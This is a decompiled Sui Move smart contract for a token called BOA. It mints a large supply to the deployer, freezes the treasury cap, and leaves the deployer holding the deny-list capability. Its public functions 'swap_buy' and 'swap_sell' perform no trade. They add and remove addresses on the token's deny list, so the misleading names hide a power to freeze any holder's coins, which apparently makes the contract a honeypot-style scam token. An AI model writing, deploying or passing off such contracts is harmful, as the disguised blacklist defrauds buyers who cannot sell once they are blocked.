module 0xf1120852796495f756bb751cfa3ec32dc39cd6f10072eb790c45661c83597181::boa {
    struct BOA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BOA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BOA>(arg0, 9, b"BOA", b"This is BOA. Copy and paste her", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmY6NL9rNSHQ6hkfGcvz2fjfaYAAWvm7ZfSNa4m6U3wQw9"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BOA>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BOA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BOA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BOA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BOA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BOA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BOA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BOA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

